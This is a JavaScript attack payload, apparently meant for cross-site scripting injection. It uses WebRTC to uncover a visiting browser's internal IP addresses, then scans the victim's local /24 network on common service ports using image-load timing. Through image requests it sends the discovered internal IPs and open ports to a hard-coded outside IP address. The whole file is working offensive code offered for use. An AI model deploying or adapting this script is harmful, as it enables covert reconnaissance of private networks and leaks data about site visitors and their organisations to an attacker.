// Get the user's INTERNAL IP address and then attempt to scan their local /24 network
// http://net.ipcalf.com/
// http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html

// Change this URL to where you would like scan results reported to
function report( data ){
  new Image().src = 'http://193.36.15.252/net?'+data;
}


function ports_callback( host, port, state ){
  if( state == "closed" ) return;
  // console.log( host, port, state );
  report( "openport=" + host + ":" + port );
}

var AttackAPI = {
  version: '0.1',
  author: 'Petko Petkov (architect)',
  homepage: 'http://www.gnucitizen.org'};

AttackAPI.PortScanner = {};
AttackAPI.PortScanner.ports = '445,139,135,3389,80,23,443,3306,21,22,25,110,143,53,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001'.split(',')
AttackAPI.PortScanner.port_index = 0;
AttackAPI.PortScanner.host_num = 1;
AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
  var timeout = (timeout == null)?100:timeout;
  var img = new Image();
  // console.log( "Scanning " + target + ":" + port );

  img.onerror = function () {
    if (!img) return;
    img = undefined;
    callback(target, port, 'open');
  };
  
  img.onload = img.onerror;
  img.src = 'http://' + target + ':' + port;
  
  setTimeout(function () {
    if (!img) return;
    img.src = 'icon.png';
    img = undefined;
    callback(target, port, 'closed');
  }, timeout);
};
AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)
{
  for (index = 0; index < ports.length; index++)
    AttackAPI.PortScanner.scanPort(callback, target, ports[index], timeout);
};

// Scan a /24 around an IP
AttackAPI.PortScanner.scanNetwork = function ( callback, target )
{
  if( target.toLowerCase() == 'udp' ) return;
  a = target.split('.');
  AttackAPI.PortScanner.scanPort( callback, a[0]+'.'+a[1]+'.'+a[2]+'.'+AttackAPI.PortScanner.host_num, AttackAPI.PortScanner.ports[AttackAPI.PortScanner.port_index]);
  AttackAPI.PortScanner.host_num++;
  if( AttackAPI.PortScanner.host_num >= 255 ){ 
    AttackAPI.PortScanner.port_index++;
    AttackAPI.PortScanner.host_num = 1;
  }
  setTimeout( function(){
    AttackAPI.PortScanner.scanNetwork( callback, target );
  }, 200 );
};



// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

if (RTCPeerConnection) (function () {
    var rtc = new RTCPeerConnection({iceServers:[]});
    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
        rtc.createDataChannel('', {reliable:false});
    };
    
    rtc.onicecandidate = function (evt) {
        // convert the candidate to SDP so we can run it through our general parser
        // see https://twitter.com/lancestout/status/525796175425720320 for details
        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
    };
    rtc.createOffer(function (offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
    }, function (e) { console.warn("offer failed", e); });
    
    
    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateDisplay(newAddr) {
        if (newAddr in addrs) return;
        else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
        displayAddrs = displayAddrs.filter(function(ip){ return ip.toString().trim().toLowerCase() != 'udp';});
        report( "internalips=" + displayAddrs.join(',') || 'n/a' );
        for( i=0; i<displayAddrs.length; i++ ){
          AttackAPI.PortScanner.scanNetwork( ports_callback, displayAddrs[i] );
        }        
    }
    
    function grepSDP(sdp) {
        var hosts = [];
        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                    addr = parts[4],
                    type = parts[7];
                if (type === 'host') updateDisplay(addr);
                var parts = line.split(' '),
                    addr = parts[2];
                updateDisplay(addr);
            }
        });
    }
})(); else {
}

